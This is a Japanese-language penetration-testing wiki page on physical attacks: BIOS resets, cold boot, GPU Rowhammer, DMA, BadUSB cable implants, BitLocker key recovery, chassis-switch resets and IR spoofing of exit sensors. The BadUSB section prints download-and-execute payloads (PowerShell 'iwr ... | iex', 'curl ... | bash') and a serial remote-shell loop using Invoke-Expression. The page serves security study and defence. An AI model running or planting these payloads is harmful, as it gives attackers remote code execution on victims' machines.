# 物理攻撃

{{#include ../banners/hacktricks-training.md}}

## BIOS Password の復旧とシステムセキュリティ

Legacy PC の firmware 設定は、CMOS battery を取り外すか、文書化された clear-CMOS jumper を使用することで reset できる場合があります。必要な電源オフ時間は board ごとに異なります。また、modern UEFI の password や key は nonvolatile flash、embedded controller、または security device に保存されている場合があり、そのため battery を取り外しても維持されます。pins を short する前に board/service manual を確認してください。この手順によって TPM measurements が無効になり、disk-encryption recovery が発生する場合もあります。

Legacy x86 systems では、**killCMOS** や **CmosPwd** などの tools を使用して、bootable environment から CMOS-backed settings を検査または変更できます。CmosPwd は、文書化された複数の older BIOS families の password formats を認識し、CMOS state の backup、restore、erase/kill が可能です。公開されている builds は、legacy DOS/Windows、Linux、FreeBSD、NetBSD environments を対象としています。<sup>[[18]](#references)</sup> これらの utilities は generic UEFI password removers ではなく、十分な hardware/firmware access が必要です。

一部の laptop firmware は、password を何度か間違えると vendor-specific challenge code を表示します。[bios-pw.org](https://bios-pw.org) などの databases は、一部の models について legacy vendor recovery passwords を導出できますが、多くの systems は導出可能な challenge を伴わない lockout を実装しています。生成された password は model-specific として扱い、永続的な attempt counters を使い切らないようにしてください。

### UEFI Security

Modern **UEFI** systems では、CHIPSEC を使用して Secure Boot variable protections を audit できます。まずは以下の non-modifying check を実行してください。オプションの `-a modify` mode は variables の破損を意図的に試みるため、復旧可能な lab system でのみ使用してください。CHIPSEC 自体も、privileged driver と low-level hardware access は production endpoints には適さないと警告しています。<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## RAM Analysis and Cold Boot Attacks

DRAM は refresh が停止しても、すべての bit を直ちに失うわけではありません。decay rate は module technology と温度によって大きく異なり、冷却することで、冷却しない power cycle よりもはるかに長時間、有用な data を保持できます。cold-boot attack では、小規模な acquisition environment へ迅速に reboot するか、冷却した module を移送し、raw memory を取得して bit decay が発生した後でも cryptographic key を再構成します。disk-copy utility は自動的に physical-memory imager になるわけではなく、Volatility は capture の取得ではなく解析を行います。platform に適合し、検証済みの acquisition tool を使用してください。<sup>[[12]](#references)</sup>

---

## GPU Rowhammer Against Page Tables

Modern GPU Rowhammer attack は、通常の buffer ではなく **GPU virtual-memory metadata** を標的にすると、はるかに有用になります。**GDDR6 NVIDIA Ampere GPU** に関する最近の研究では、攻撃者が unprivileged CUDA code を実行し、GPU 固有の hammering pattern を構築し、**memory massaging** を使って paging structure を脆弱な row に配置し、さらに **last-level page table** または中間の **page directory** の bit を flip できることが示されています。1 つの translation entry が破損すると、攻撃者は **arbitrary GPU memory read/write** を bootstrap し、その後 host compromise へ pivot できます。<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6 の **hammerable row** を profile し、in-DRAM mitigation を回避する refresh-aware / non-uniform hammering pattern を構築します。
2. **GPU allocation** を **massage** し、driver が page-translation structure を default の protected pool に保持するのではなく、hammerable な physical location に配置するようにします。実際には、low-memory page-table region を枯渇させ、制御された stride で大規模な sparse UVM mapping を spray することを意味します。
3. page-table / page-directory entry 内の **PFN** や aperture-related bit などの **translation metadata** を flip し、攻撃者が制御する virtual page が page-table page、arbitrary GPU memory、または host-visible system mapping に解決されるようにします。
4. 偽造した mapping を再利用して追加の translation entry を書き換え、GPU context 全体に対する **arbitrary GPU memory read/write** へ escalate します。

### Host Pivot and Mitigations

- **IOMMU が無効** の場合、偽造した system-aperture mapping によって arbitrary **host physical memory** が GPU に公開され、GPU primitive が full host compromise へつながります。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** は last-level page-table entry を標的にします。一方、**GeForge** は、1 bit の flip でより大きな translation subtree を再標的化できるため、page-directory level の破損の方が容易な場合があることを示しています。1 つの paging layer だけを security-critical と考えないでください。<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** は、GDDRHammer/GeForge が使用する arbitrary-host-memory への直接 path を阻止するため、依然として重要です。しかし、**完全な mitigation ではありません**。**GPUBreach** は、攻撃者が GPU-writable で driver-owned の CPU buffer を破損させ、その後 NVIDIA driver の memory-safety bug を誘発して kernel write primitive と **root shell** を取得する second-stage pivot を示しています。これは IOMMU が有効な場合でも可能です。<sup>[[3]](#references)</sup>
- 対応する workstation/server GPU では、**system-level ECC** が実用的な hardening step です。ECC のない consumer GPU は、より弱い defense surface を公開します。<sup>[[4]](#references)</sup>
- これらの attack は純粋に理論上のものではありません。**GeForge** は RTX 3060 で **1,171** 回、RTX A6000 で **202** 回の bit flip を報告しており、これは動作する host-privilege-escalation chain の構築に十分でした。<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

pre-boot IOMMU enforcement を downgrade し、Windows DMA chain を有効化できる offline UEFI IFR/NVRAM patching については、以下を参照してください。

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** は、FireWire や初期の Thunderbolt configuration などの interface を介した **DMA-based memory acquisition and patching** を実証しており、過去の login-bypass signature も含まれます。これは単に「Windows 10 に対して ineffective」というものではありません。exploitability は interface、target build、IOMMU policy、lock state、および Windows Kernel DMA Protection がサポートされ有効になっているかどうかに依存します。Windows 10 version 1803 以降では、互換性のある platform に Kernel DMA Protection が導入され、attack surface が大きく変化しました。<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB for System Access

暗号化されていない、またはすでに unlock されている Windows volume では、offline environment により **sethc.exe** や **Utilman.exe** などの accessibility binary を **cmd.exe** に置き換え、対応する logon-screen shortcut が実行されたときに SYSTEM command prompt を表示させることができます。**chntpw** などの tool は、local SAM account data を編集できます。これらの方法は、lock された BitLocker volume を bypass できず、DPAPI/EFS で保護された credential を損傷させる可能性があります。forensic copy と backup を保持してください。

**Kon-Boot** は、対応する Windows/macOS configuration 向けの commercial boot-time authentication-bypass tool です。互換性は OS、firmware mode、Secure Boot、disk-encryption setup に依存します。BitLocker で lock された volume を decrypt することはできません。<sup>[[10]](#references)</sup>

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Delete/Supr**、F2、F10、またはその他の vendor key により、firmware setup が開く場合があります。
- **F8** は、その path が有効なままになっている configuration でのみ legacy Windows advanced boot option に入ります。current recovery entry は異なります。
- **Shift** を押し続けると、一部の configuration では Windows automatic logon を抑制できます。ただし、policy/registry setting によってこの動作を無効化できます。<sup>[[17]](#references)</sup>

### BAD USB Devices

**USB Rubber Ducky** や Teensy board などの device は、trusted HID keyboard として enumerate し、事前定義された keystroke を inject できます。payload は、最初は logged-on session の privilege と desktop access を持ちます。UAC prompt、screen lock、keyboard layout、timing、endpoint USB policy によって、引き続き制約されます。<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator または backup privilege があれば、shadow copy を作成したり registry hive を保存したりして、**SAM** や **SYSTEM** などの lock された file を取得できます。これは post-compromise collection technique であり、privilege bypass ではありません。また、`diskshadow`/VSS および registry-hive export event と相関付ける必要があります。

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- **Evil Crow Cable Wind** などの ESP32-S3-based implant は、USB-A→USB-C または USB-C↔USB-C cable 内部に隠れ、純粋に USB keyboard として enumerate し、Wi-Fi 経由で C2 stack を公開します。operator は、victim host から cable に給電し、password `123456789` の hotspot `Evil Crow Cable Wind` を作成して、[http://cable-wind.local/](http://cable-wind.local/)（または DHCP address）を browse するだけで、組み込み HTTP interface にアクセスできます。<sup>[[8]](#references)</sup>
- browser UI には、*Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell*、*Config* の tab があります。保存された payload には OS ごとの tag が付けられ、keyboard layout は on the fly で切り替えられ、VID/PID string は既知の peripheral を mimic するよう変更できます。
- C2 が cable 内部に存在するため、phone から payload の stage、execution の trigger、Wi-Fi credential の管理を行えます。組織の network を使用する必要がないため、短い dwell-time の physical intrusion に有用です。

### OS-aware AutoExec payloads

- AutoExec rule は、1 つ以上の payload を USB enumeration の直後に fire するよう bind します。implant は軽量な OS fingerprinting を実行し、一致する script を選択します。
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) または `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- execution は unattended で行われるため、charging cable を交換するだけで、logged-on user context における「plug-and-pwn」initial access を実現できます。

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** 保存された payload が console を開き、新しい USB serial device に到着した内容を実行する loop を paste します。最小限の Windows variant は次のとおりです。
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** implantはUSB CDC channelを開いたまま、ESP32-S3からoperatorへTCP client（Python script、Android APK、またはdesktop executable）を起動します。TCP sessionに入力されたバイト列は上記のserial loopへ転送されるため、air-gapped host上でもremote command executionが可能です。出力は限られているため、operatorは通常、blind command（account creation、追加toolingのstagingなど）を実行します。

### HTTP OTA update surface

- documented Evil Crow Cable Wind interfaceは、`/update`にunauthenticated firmware-update endpointを公開しています。<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators は、エンゲージメントの途中でも機能を hot-swap できます（例: flash USB Army Knife firmware）。ケーブルを開くことなく機能を切り替えられるため、ターゲットホストに接続したまま implant を新しい機能へ移行できます。

## BitLocker Encryption のバイパス

稼働中、または最近まで稼働していたシステムを、承認を受けて forensic acquisition した場合、ボリュームがアンロックされている間に、BitLocker の volume master key または関連する key material が含まれている可能性があります。Elcomsoft Forensic Disk Decryptor や Passware Kit Forensic などの Commercial tools は、対応する memory images、hibernation files、または crash dumps を検索できますが、成功は保証されません。最新の Windows では、BitLocker が有効な場合、crash dumps も暗号化されます。また、保存された 48 桁の recovery password は、メモリ上の volume key とは異なる artifact です。<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering for Recovery Key Addition

攻撃者が管理者を説得して BitLocker-management commands を実行させると、recovery-password、external-key、その他の protector を追加し、それを取得できる可能性があります。recovery password に任意のゼロ文字列を指定することはできません。BitLocker の numerical recovery password には、検証済みの 48 桁形式が必要です。承認された administration で使用する関連 syntax は `manage-bde -protectors -add C: -recoverypassword` です。結果として作成された protectors は `manage-bde -protectors -get C:` で一覧表示できます。protector の追加を監視し、新しい recovery material が承認済みの場所にのみ escrow されるようにしてください。<sup>[[16]](#references)</sup>

---

## Chassis Intrusion / Maintenance Switches を悪用した BIOS の Factory Reset

多くの最新 laptop や small-form-factor desktop には、Embedded Controller (EC) と BIOS/UEFI firmware によって監視される **chassis-intrusion switch** が搭載されています。この switch の主な目的は、デバイスが開けられた際に alert を発生させることですが、vendor が switch を特定の pattern で切り替えたときに発動する **undocumented recovery shortcut** を実装している場合があります。<sup>[[5]](#references)[[6]](#references)</sup>

### Attack の仕組み

1. switch は EC 上の **GPIO interrupt** に接続されています。
2. EC 上で動作する firmware は、**press の timing と回数**を追跡します。
3. hard-coded pattern が認識されると、EC は *mainboard-reset* routine を呼び出し、system NVRAM/CMOS の **内容を消去**します。
4. 次回 boot 時に、対象 model は reset された firmware state を読み込みます。vendor と revision によっては、消去される state に supervisor password、custom boot settings、または enrolled Secure Boot keys が含まれる場合があります。TPM state と disk-encryption への影響は別途評価する必要があります。

> firmware reset により external-boot options が復元される場合がありますが、storage が **復号されるわけではありません**。BitLocker または別の full-disk encryption system は、TPM/firmware の変更後に recovery に移行することがあり、recovery key がなくても internal drive を保護し続けます。<sup>[[16]](#references)</sup>

### 実例 – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen) の recovery shortcut は次のとおりです。
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
10回目のサイクル後、ECは次回の再起動時にNVRAMを消去するようBIOSに指示するフラグを設定します。手順全体にかかる時間は約40秒で、必要なのは**ドライバーだけ**です。<sup>[[5]](#references)</sup>

### Generic Exploitation Procedure

1. ECが動作している状態にするため、対象を電源オンにするか、サスペンドから復帰させます。
2. 底面カバーを取り外し、intrusion/maintenance switchを露出させます。
3. ベンダー固有のtoggleパターンを再現します（ドキュメントやフォーラムを参照するか、EC firmwareをreverse-engineerします）。
4. 再組み立てしてrebootし、実際に変更されたfirmware設定とcredentialを確認します。
5. 認可済みでexternal bootが利用可能な場合は、管理下のlive imageをbootします。内部volumeのロックが正当に解除されている場合（または暗号化されていなかった場合）、live environmentによってcredentialやdataを取得したり、EFI System Partitionを検査したりできます。そのpartitionを変更してEFI implantをインストールする行為はpersistentかつ非常に侵襲的であり、Secure Boot、measured boot、firmware write protection、endpoint monitoringによる制約を受けます。暗号化されたstorageには、そのkeyまたはrecovery materialなしではアクセスできません。

### Detection & Mitigation

* OS management consoleでchassis-intrusion eventを記録し、予期しないBIOS resetと相関付けます。
* 開封を検知するため、ねじやカバーに**tamper-evident seal**を使用します。
* デバイスを**物理的に管理されたエリア**に保管し、physical accessはfull compromiseと同等だと想定します。
* 利用可能な場合は、ベンダーの「maintenance switch reset」機能を無効化するか、NVRAM resetに追加のcryptographic authorisationを要求します。

---

## No-Touch Exit Sensorに対するCovert IR Injection

### Sensor Characteristics
- 一般的な「wave-to-exit」sensorは、near-IR LED emitterとTV remote風のreceiver moduleを組み合わせたもので、正しいcarrierのpulseを複数回（約4～10回）受信した後にのみlogic highを報告します（約30 kHz）。<sup>[[7]](#references)</sup>
- plastic shroudによってemitterとreceiverが互いを直接見られないようになっているため、controllerは、検証済みのcarrierが近傍のreflectionから来たものだと判断し、door strikeを開くrelayを駆動します。
- controllerがtargetの存在を認識すると、outbound modulation envelopeを変更することが多いものの、receiverはfiltered carrierに一致するburstを引き続き受け入れます。

### Attack Workflow
1. **Emission profileをcaptureする** – controller pin間にlogic analyserを接続し、内部IR LEDを駆動する、detection前後の両方のwaveformを記録します。
2. **「post-detection」waveformのみをreplayする** – stock emitterを取り外すか無視し、最初からtrigger済みのpatternでexternal IR LEDを駆動します。receiverはpulse count/frequencyのみを認識するため、spoofされたcarrierを正規のreflectionとして扱い、relay lineをassertします。
3. **Transmissionをgateする** – carrierを調整したburst（例：数十ミリ秒オン、同程度オフ）で送信し、receiverのAGCやinterference handling logicを飽和させずに最小限のpulse countを送ります。連続送信するとsensorの感度が急速に低下し、relayが作動しなくなります。

### Long-Range Reflective Injection
- bench LEDをhigh-power IR diode、MOSFET driver、focusing opticsに置き換えると、約6 m離れた場所から確実にtriggerできます。
- attackerはreceiver apertureへのline-of-sightを必要としません。ガラス越しに見える内部の壁、棚、door frameにbeamを向けることで、reflectionされたenergyを約30°のfield of view内に入射させ、近距離でのhand waveを模倣できます。
- receiverは弱いreflectionのみを想定しているため、はるかに強いexternal beamでも複数のsurfaceでbounceさせながらdetection thresholdを上回ることができます。

### Weaponised Attack Torch
- driverを市販のflashlight内部に組み込むことで、toolを目立たない状態で隠せます。visible LEDをreceiverのbandに合わせたhigh-power IR LEDに交換し、ATtiny412（または同等品）を追加して約30 kHzのburstを生成し、MOSFETでLED currentをsinkします。
- telescopic zoom lensによってrange/precision向けにbeamを絞り、MCU制御のvibration motorによって、visible lightを発することなくmodulationが有効であることをhapticに確認できます。
- 複数の保存済みmodulation pattern（carrier frequencyとenvelopeを少しずつ変えたもの）を切り替えることで、rebrandされたsensor family間のcompatibilityが向上します。これによりoperatorはreflection surfaceを順番に照射し、relayが音を立ててclickし、doorがreleaseされるまで試行できます。

---

## References

- [1] [GDDRHammer: 大きくDRAM行を乱す — Modern GPUにおけるComponent間Rowhammer Attack](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GDDR MemoryをHammeringしてGPU Page TableをForgeするFun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammerを使用したGPU上のPrivilege Escalation Attack](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - 2025年7月](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – 「Framework 13。ここを押してpwn」](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – 「Noooooooo Touch! – Covert IR TorchによるIR No-Touch Exit SensorのBypassing」](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – 「Plug, Play, Pwn: Evil Crow Cable WindによるHacking」](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA Chipに対するRowhammer Attack](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Encryption Keyに対するCold Boot Attack](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMAによるphysical memory manipulation](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shiftを押した場合とautomatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
